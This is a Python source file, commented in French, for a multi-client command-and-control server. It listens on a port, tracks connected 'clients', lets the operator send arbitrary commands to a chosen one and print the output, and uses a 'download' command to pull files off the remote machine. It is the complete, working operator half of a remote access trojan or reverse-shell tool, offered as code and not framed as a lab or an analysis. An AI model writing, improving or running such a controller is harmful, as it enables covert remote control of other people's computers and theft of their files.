import socket
import struct
import threading 

HOST = '0.0.0.0'  
PORT = 12345


# Création du socket serveur
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #liberer le port après une interruption
server_socket.bind((HOST, PORT))
server_socket.listen(5)

print(f"Serveur en attente de connexion sur {HOST}:{PORT}")

clients = []
lock = threading.Lock()



# COMMANDE : download 
def recv_all(sock, length):
    data = b''
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise EOFError("Connexion interrompue")
        data += more
    return data




def receive_files(sock):
    try:
        while True:
            # Lire la longueur du nom de fichier (4 octets)
            raw = sock.recv(4)
            if not raw:
                break  # fin de transmission
            name_len = struct.unpack("!I", raw)[0]

            filename = recv_all(sock, name_len).decode()

            if filename.startswith("__ERROR__"):
                print(f"Erreur côté client : {filename}")
                continue

            # Lire la taille du fichier (8 octets)
            filesize = struct.unpack("!Q", recv_all(sock, 8))[0]

            print(f"⬇Réception de {filename} ({filesize} octets)...")

            with open(f"downloaded_{filename}", "wb") as f:
                remaining = filesize
                while remaining > 0:
                    chunk = sock.recv(min(4096, remaining))
                    if not chunk:
                        raise EOFError("Interruption lors du transfert")
                    f.write(chunk)
                    remaining -= len(chunk)

            print(f"Fichier reçu : downloaded_{filename}")

    except Exception as e:
        print(f"Erreur lors de la réception : {e}")




# GESTION CLIENT 
def handle_client(sock, addr, cid):
    print(f"[+] Contrôle de Client {cid} actif. Tapez 'exit' pour revenir.")

    while True:
        try:
            command = input(f"[Client {cid}] > ").strip()

            if command == "exit":
                print(f"[~] Retour au menu principal depuis Client {cid}")
                return

            elif command == "disconnect":
                sock.send(command.encode())
                print(f"[!] Déconnexion demandée à Client {cid} (attente fermeture)...")

                sock.settimeout(3.0)  # éviter de bloquer à l’infini
                try:
                    data = sock.recv(1024)
                    if not data:
                        print(f"[✓] Client {cid} a fermé la connexion.")
                    else:
                        print(f"[✓] Message reçu avant fermeture : {data.decode().strip()}")
                except socket.timeout:
                    print(f"[~] Timeout : pas de réponse, socket probablement fermée.")
                except Exception as e:
                    print(f"[!] Erreur durant la fermeture : {e}")
                finally:
                    sock.close()
                    with lock:
                        clients[:] = [c for c in clients if c[2] != cid]
                    return

            # Commande normale
            sock.send(command.encode())

            if command.startswith("download "):
                receive_files(sock)
            else:
                response = sock.recv(4096).decode()
                print(f"[{cid}] Réponse :\n{response}")

        except Exception as e:
            print(f"[!] Erreur avec Client {cid} : {e}")
            with lock:
                clients[:] = [c for c in clients if c[2] != cid]
            break



def accept_clients():
    client_id = 1
    while True:
        client_socket, addr = server_socket.accept()
        with lock:
            clients.append((client_socket, addr, client_id))
        print(f"[+] Nouveau client {client_id} connecté depuis {addr}")
        client_id += 1

accept_thread = threading.Thread(target=accept_clients, daemon=True)
accept_thread.start()



while True:
    with lock:
        if not clients:
            print("Aucun client connecté.")
        else:
            print("\n[+] Clients connectés :")
            for _, addr, cid in clients:
                print(f"  {cid} -> {addr[0]}:{addr[1]}")

    cmd = input("\n>> use <id> | refresh | exit\n> ").strip()

    if cmd == "exit":
        print("Fermeture du serveur.")
        break

    elif cmd == "refresh":
        continue

    elif cmd.startswith("use "):
        try:
            target_id = int(cmd.split()[1])
            with lock:
                client_copy = list(clients)  # ← empêche les modifications pendant l'itération

            for s, a, cid in client_copy:
                if cid == target_id:
                    handle_client(s, a, cid)
                    break
            else:
                print("ID introuvable.")

        except ValueError:
            print("ID invalide.")

    else:
        print("Commande inconnue.")